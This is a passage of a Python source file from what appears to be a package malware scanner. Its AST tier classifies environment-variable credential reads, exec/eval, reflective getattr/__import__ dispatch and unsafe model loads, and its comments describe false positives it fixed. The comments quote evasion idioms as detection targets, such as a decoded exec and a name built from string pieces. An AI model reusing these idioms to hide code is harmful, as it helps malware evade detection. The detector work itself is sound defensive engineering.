            if "urlsafe" in (self._dotted(node.func) or "")
            else base64.b64decode
        )
        try:
            return decode(encoded + "=" * (-len(encoded) % 4)).decode("utf-8")
        except (ValueError, UnicodeDecodeError):
            return None

    def _keyed_environment_reads(self, tree: ast.AST) -> dict[int, str]:
        """Environment nodes that are read with one literal key, and that key.

        The judgement has to be made at the PARENT: `os.environ` and
        `os.environ["PATH"]` contain the same `Attribute` node, so the bare-name
        branch of the walk cannot tell a whole-environment read from a single
        setting without looking up. A node absent from this map was either used
        as a whole mapping -- passed somewhere, copied, iterated, unpacked -- or
        subscripted with something computed, and both of those are the broad
        access.
        """
        keyed: dict[int, str] = {}
        written: set[int] = set()
        for node in PythonSyntax.of(tree, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Subscript) and self._dotted(target.value) in ENVIRONMENT:
                    # `os.environ["X"] = "1"` SETS a variable. Reading the
                    # environment is what this primitive is about, and a Google
                    # Workspace setup script in `NousResearch/hermes-agent` was
                    # reported for exfiltration on the strength of
                    # `os.environ["OAUTHLIB_RELAX_TOKEN_SCOPE"] = "1"`.
                    written.add(id(target.value))

        candidates = self._iterated_literals(tree)
        for node_id in self._environment_handed_to_children(tree):
            keyed[node_id] = ""

        for node in PythonSyntax.of(tree, ast.Subscript, ast.Call, ast.Compare):
            if isinstance(node, ast.Subscript):
                # `os.environ["NAME"]`
                key = self._key_of(node.slice, candidates)
                if key is not None and self._dotted(node.value) in ENVIRONMENT:
                    keyed[id(node.value)] = key
            elif isinstance(node, ast.Call):
                key = self._key_of(node.args[0], candidates) if node.args else None
                if key is None:
                    continue
                if self._dotted(node.func) in ENVIRONMENT:
                    # `os.getenv("NAME")`. Mapped against the function node,
                    # because the walk reaches that as a bare `Attribute` too and
                    # would record it whatever `_call` decided.
                    keyed[id(node.func)] = key
                elif (
                    isinstance(node.func, ast.Attribute)
                    and node.func.attr in {"get", "setdefault", "pop"}
                    and self._dotted(node.func.value) in ENVIRONMENT
                ):
                    # `os.environ.get("NAME")`, and the two methods that read the
                    # same way.
                    keyed[id(node.func.value)] = key
            elif isinstance(node, ast.Compare):
                # `"NAME" in os.environ` asks whether one setting is present and
                # obtains no value at all, so it is a weaker act than any of the
                # keyed reads above. It reached none of them: a `Compare` names no
                # key, registered nothing, and so the bare-`Attribute` branch of
                # the walk saw an unkeyed `os.environ` and called it
                # whole-environment access -- the broadest reading available, for
                # the narrowest act there is.
                #
                # `saltstack/salt` writes `if "WRITE_SALT_VERSION" in os.environ`
                # three times in its `setup.py` and `if "SALT_VERSION" in
                # os.environ` in `salt/version.py`. Both files are install-time by
                # definition and both reach the network, so both were
                # `MALWARE.EXFIL.001` at CRITICAL -- "reads credentials and
                # transmits them" -- for build flags that gate a version string.
                #
                # Judged by the name, like every other keyed read, rather than by
                # a second rule of its own. A presence test on a name that reads
                # as a credential is still worth the label, because code that asks
                # whether a token is set is code that means to use it, and the
                # read itself is its own hit wherever it happens.
                left: ast.expr = node.left
                for op, comparator in zip(node.ops, node.comparators, strict=True):
                    if isinstance(op, ast.In | ast.NotIn) and (
                        self._dotted(comparator) in ENVIRONMENT
                    ):
                        key = PythonFacts.constant(left)
                        if key is not None:
                            keyed[id(comparator)] = key
                    left = comparator
        for node_id in written:
            # A written name is not a read at all, whatever the name says.
            keyed[node_id] = ""
        return keyed

    def _key_of(self, node: ast.AST, candidates: dict[str, list[str]]) -> str | None:
        # A literal, or a loop variable drawn from a literal sequence of names --
        # `for n in ("http_proxy", "HTTPS_PROXY"): os.environ[n]`, which is how nodeenv
        # passes proxy settings on. Every candidate is judged, joined, so one name that
        # reads as a credential keeps the read a credential read.
        key = PythonFacts.constant(node)
        if key is None and isinstance(node, ast.Name) and node.id in candidates:
            return " ".join(candidates[node.id])
        return key

    def _call(self, node: ast.Call) -> None:
        dotted = self._dotted(node.func)
        if dotted == "open" and node.args:
            self._opened_for_persistence(node)
        if dotted in UNSAFE_LOADERS and self._loads_a_bundled_file(node, dotted):
            self._record(Capability.EXECUTE, node, f"unsafe model load: {dotted}")
        if self._runs_remote_model_code(node):
            self._record(Capability.EXECUTE, node, f"remote model code: {dotted or 'call'}")
        unsafe_option = PythonFacts.unsafe_model_option(node, dotted)
        if unsafe_option:
            self._record(Capability.EXECUTE, node, f"unsafe model option: {unsafe_option}")
        if dotted and dotted in PRIMITIVES:
            if dotted in ENVIRONMENT and PRIMITIVES[dotted] is Capability.CREDENTIAL:
                # `os.getenv("NAME")`, whose key is its first argument. With no
                # literal key the name is computed, and a computed lookup into the
                # environment is the broad access rather than a named setting.
                key = PythonFacts.constant(node.args[0]) if node.args else None
                if key is not None and not CREDENTIAL_VARIABLE.search(key):
                    return
            if (
                dotted in ("exec", "eval")
                and node.args
                and self._read_from_local_file(node.args[0])
            ):
                # `for l in open("src/pkg/__init__.py"): if l.startswith("Version"): exec(l, D)`
                # -- how reportlab's `setup.py`, and a great many others, read their own version.
                # The text is the package's own file, scanned here as what it is.
                self._excused_lines.add(node.lineno)
                return
            self._record(
                PRIMITIVES[dotted],
                node,
                dotted,
                command=self._command(node),
                fixed=PythonFacts.fixed_command(node),
            )
            return

        base = dotted.split(".")[-1] if dotted else None
        if base not in REFLECTIVE:
            return

        # `getattr(os, "system")` and friends. The first argument names the
        # namespace, the second the attribute.
        namespace = self._dotted(node.args[0]) if node.args else None
        attribute = PythonFacts.constant(node.args[1]) if len(node.args) > 1 else None

        if base == "__import__":
            imported = PythonFacts.constant(node.args[0]) if node.args else None
            first = node.args[0] if node.args else None
            if isinstance(first, ast.Name) and first.id in self._enumerated:
                # Enumerated rather than computed. See `_collect_names`.
                return
            if imported is None and first is not None and self._assembled_name(first):
                self._dynamic(node, "__import__ with a computed module name")
            return

        if attribute is not None and namespace:
            resolved = f"{namespace}.{attribute}"
            if resolved in PRIMITIVES:
                callsite = self._invoked.get(id(node), node)
                self._record(
                    PRIMITIVES[resolved],
                    node,
                    resolved,
                    command=self._command(callsite),
                    fixed=PythonFacts.fixed_command(callsite),
                )
                return
        if (
            len(node.args) > 1
            and attribute is None
            and namespace in DANGEROUS_NAMESPACES
            and self._assembled_name(node.args[1])
        ):
            if len(node.args) > 2 and id(node) not in self._invoked:
                # A DEFAULT, and nothing called. `getattr(x, name, None)` asks whether an
                # attribute exists and is prepared for it not to: the third argument is
                # the caller saying so. `unslothai/unsloth` writes
                # `if getattr(sys, f"__{name}__", None) is None:` to detect its runtime.
                #
                # Both halves are needed. `getattr(os, decode(blob), None)()` has a
                # default and IS dispatch, which is what the invocation test is for.
                return
            self._dynamic(node, f"{base} on {namespace} with a computed name")

    def _assembled_name(self, node: ast.AST) -> bool:
        """Whether a name handed to `__import__` or `getattr` could be anything.

        A literal is known, and so is a variable bound once to a plain one -- `PACKAGE = "Tea"`
        then `__import__(PACKAGE)`, how a great many `setup.py` files read their own version. A
        variable bound to a string built from pieces, `name = "sys" + "tem"`, is not: building it
        is the evasion, whatever it folds to. An
        attribute, `__import__(self.module)`, is a configuration object choosing a backend, which
        is what plugin loaders and build systems are made of. Anything else -- a parameter, a loop
        variable over something fetched, a built string -- stays dynamic: the name could be
        whatever the code was handed, which is the dispatch this tier exists to notice.
        """
        if isinstance(node, ast.Name) and node.id in self._plain_literals:
            return False
        return not isinstance(node, ast.Attribute)

    def _subscript(self, node: ast.Subscript) -> None:
        """`__builtins__["ex" + "ec"]` and `globals()["exec"]`."""
        container = self._dotted(node.value)
        if isinstance(node.value, ast.Call):
            inner = self._dotted(node.value.func)
            container = inner.split(".")[-1] if inner else None
        key = PythonFacts.constant(node.slice)

        if key is not None:
            if key in PRIMITIVES:
                self._record(PRIMITIVES[key], node, key)
            elif container and f"{container}.{key}" in PRIMITIVES:
                self._record(PRIMITIVES[f"{container}.{key}"], node, f"{container}.{key}")
            return

        if isinstance(node.ctx, ast.Store | ast.Del):
            # `globals()[name] = value` WRITES a name; it does not reach one. Re-exporting
            # from a C extension is how PyTorch populates `torch._dynamo`:
            #
            #     globals()[name] = getattr(torch._C._dynamo.eval_frame, name)
            #
            # Thirteen of PyTorch's twenty-five findings were that line and its siblings,
            # and `globals()[metric] += getattr(delta, metric)` is the same idiom
            # accumulating counters. The rule is about reaching a function by a computed
            # name, which is the READ half -- and the `getattr` on the right of these
            # assignments is exactly that, so the file still carries the capability when
            # the name it reads is genuinely computed.
            return

        if container in DANGEROUS_NAMESPACES or container in {"globals", "vars", "locals"}:
            if container in {"globals", "vars", "locals"} and id(node) not in self._invoked:
                # A READ of a module-level name, with nothing called.
                # `NousResearch/hermes-agent` caches a rendered banner as
                # `cached = globals()[cache_name]`, which reaches a VALUE by a computed
                # name -- and this rule is about reaching a FUNCTION by one.
                #
                # Only for the namespace dictionaries. `__builtins__[name]` stays a
                # finding whether it is called here or passed somewhere that will call
                # it, because nothing in `__builtins__` is a value worth fetching by a
                # computed name.
                return
            self._dynamic(node, f"{container}[...] with a computed key")

    # -- Recording -------------------------------------------------------

    def _record(
        self,
        capability: Capability,
        node: ast.AST,
        detail: str,
        command: str | None = None,
        *,
        fixed: bool = False,
    ) -> None:
        keep = command if capability is Capability.SPAWN else None
        self._hits.append(
            AstHit(
                capability=capability,
                line=getattr(node, "lineno", 1),
                column=getattr(node, "col_offset", 0),
                detail=detail,
                command=keep,
                fixed_command=fixed and capability is Capability.SPAWN,
            )
        )

    def _dynamic(self, node: ast.AST, detail: str) -> None:
        """Reflective dispatch whose target could not be resolved.

        This is the point of the tier rather than a gap in it. An attacker who
        goes dynamic to escape the name match is forced to light this up
        instead, and combined with the decode, egress or credential access that
        malware needs anyway it is a combination with almost no benign
        analogue.
        """
        self._hits.append(
            AstHit(
                capability=Capability.DYNAMIC_DISPATCH,
                line=getattr(node, "lineno", 1),
                column=getattr(node, "col_offset", 0),
                detail=detail,
            )
        )

    @classmethod
    def excused_lines(cls, source: str) -> dict[Capability | str, frozenset[int]]:
        """Lines where the pattern tier's match is a known-harmless form this tier can see.

        `exec` of text read from the package's own file (EXECUTE), and the whole environment
        copied only to become a child process's environment (CREDENTIAL). The pattern tier sees
        `exec(` and `os.environ` and cannot tell what follows; the caller drops its hits on these
        lines and keeps every other."""
        try:
            tree = PythonSyntax.shared(source)
        except (SyntaxError, ValueError, RecursionError):
            return {}
        analyzer = PythonAnalyzer._prepared(tree)
        analyzer._walk(tree)
        handed = analyzer._environment_handed_to_children(tree)
        environment = {
            node.lineno
            for node in PythonSyntax.nodes(tree)
            if id(node) in handed and hasattr(node, "lineno")
        }
        # A line that also reads the environment some other way keeps its pattern hit.
        environment -= {
            node.lineno
            for node in PythonSyntax.nodes(tree)
            if analyzer._dotted(node) in ENVIRONMENT
            and id(node) not in handed
            and hasattr(node, "lineno")
        }
        own_name = frozenset(
            node.lineno
            for node in PythonSyntax.nodes(tree)
            if isinstance(node, ast.Call)
            and (analyzer._dotted(node.func) or "") in DNS_LOOKUPS
            and node.args
            and PythonFacts._own_name_locally(node.args[0])
        )
        patterns = PythonFacts._pattern_literals(tree)
        return {
            "CAP.EGRESS.DNS_CONSTRUCTED.001": own_name,
            Capability.PERSIST: PythonFacts._persistence_named_not_written(tree)
            | patterns
            | PythonFacts._persistence_not_reaching_a_write(source, tree, analyzer._hits),
            Capability.EXECUTE: frozenset(analyzer._excused_lines),
            Capability.CREDENTIAL: frozenset(environment) | patterns,
            Capability.DECODE: analyzer._decoded_into_data_parsers(tree),
        }

    @classmethod
    def calls(cls, source: str) -> list[AstCall]:
        """Every call in this source, with callee and arguments resolved.

        The same resolution `analyse` applies to the fixed `PRIMITIVES` table,
        exposed for rules to query instead. That table is this module's own
        list of what matters; a rule pack needs to name its own.

        Unparseable source yields nothing, which the caller must treat as "not
        examined" rather than "nothing here" -- the regex tier still runs over
        the same file, which is why this is an addition to it and never a
        replacement.
        """
        try:
            tree = PythonSyntax.shared(source)
        except (SyntaxError, ValueError, RecursionError):
            return []
        analyzer = PythonAnalyzer._prepared(tree)
        # `_invoked` maps an inner call to the call that invokes its result, so
        # `getattr(os, "system")("...")` can find the argument list that belongs
        # to the outer parentheses.
        for node in PythonSyntax.of(tree, ast.Call):
            if isinstance(node.func, ast.Call | ast.Subscript):
                analyzer._invoked[id(node.func)] = node

        # What each plain name is assigned, so a hostname assembled into a variable on one line
        # and resolved on the next reads as the built value it is.
        assigned: dict[str, list[ast.AST]] = {}
        for node in PythonSyntax.of(tree, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Name):
                    assigned.setdefault(target.id, []).append(node.value)

        def constructed(argument: ast.AST) -> bool:
            if PythonFacts._is_constructed(argument):
                return True
            values = assigned.get(argument.id, []) if isinstance(argument, ast.Name) else []
            return bool(values) and all(
                PythonFacts._is_constructed(value) and PythonFacts._has_dotted_literal(value)
                for value in values
            )

        found: list[AstCall] = []
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = analyzer._resolve_callee(node)
            if resolved is None:
                continue
            name, callsite = resolved
            found.append(
                AstCall(
                    name=name,
                    line=getattr(node, "lineno", 0),
                    column=getattr(node, "col_offset", 0),
                    arguments=tuple(analyzer._argument_value(a) for a in callsite.args),
                    keywords=tuple(
                        (kw.arg, analyzer._argument_value(kw.value))
                        for kw in callsite.keywords
                        if kw.arg
                    ),
                    has_constructed_argument=any(constructed(a) for a in callsite.args),
                )
            )
        return found

    @classmethod
    def _prepared(cls, tree: ast.AST) -> PythonAnalyzer:
        """An analyser with this tree's name tables already built, each table its own copy.

        Four entry points (`analyse`, `calls`, `excused_lines` and `PythonSource.loop_delay_lines`)
        each built the same tables from scratch: 3.2 builds per file. They are built once per tree now, kept on it, and copied per caller, so what one
        caller adds -- `_walk` fills `_invoked` and records hits -- reaches no other.
        """
        base = tree.__dict__.get("_cordon_names")
        if base is None:
            base = cls()
            base._collect_names(tree)
            tree.__dict__["_cordon_names"] = base
        fresh = cls()
        for name, value in vars(base).items():
            if name == "_hits":
                continue
            setattr(fresh, name, value.copy() if isinstance(value, dict | set | list) else value)
        return fresh

    @classmethod
    def safe_spawn_lines(cls, source: str) -> frozenset[int]:
        """Lines of a spawn or execute whose command is provably source-free, so it cannot be
        running a decoded value -- the Python analogue of `JsFlow.safe_spawn_lines`, which
        `DecodeRun` uses to drop such a spawn from a decode-run pairing. `os.system(f"{sys.executable}
        -m pip install requests")` is here; `exec(b64decode(blob))` and `subprocess.run(cmd)` for
        any sourced `cmd` are not (fail-closed). A bare shell, a `start x.vbs` script launch, or a
        command that runs a file the unit writes is kept too: there the literal IS the act
        (`_fixed_command`'s guards)."""
        try:
            tree = PythonSyntax.shared(source)
        except (SyntaxError, ValueError, RecursionError):
            return frozenset()
        analyzer = PythonAnalyzer._prepared(tree)
        analyzer._walk(tree)
        lines: set[int] = set()
        for node in PythonSyntax.of(tree, ast.Call):
            if PRIMITIVES.get(analyzer._dotted(node.func) or "") not in (
                Capability.SPAWN,
                Capability.EXECUTE,
            ):
                continue
            folded = analyzer._source_free_command(node)
            if (
                folded is None
                or PythonFacts.BARE_SHELL.match(folded)
                or SCRIPT_LAUNCH.search(folded)
            ):
                continue
            if PythonFacts.WRITABLE_TARGET.search(folded) is None:
                lines.add(node.lineno)
        return frozenset(lines)


SLEEP_CALLS = frozenset({"time.sleep", "asyncio.sleep", "trio.sleep", "anyio.sleep"})
"""The ways Python waits, as a dotted name."""


__all__ = ["SLEEP_CALLS", "PythonAnalyzer", "PythonSource"]
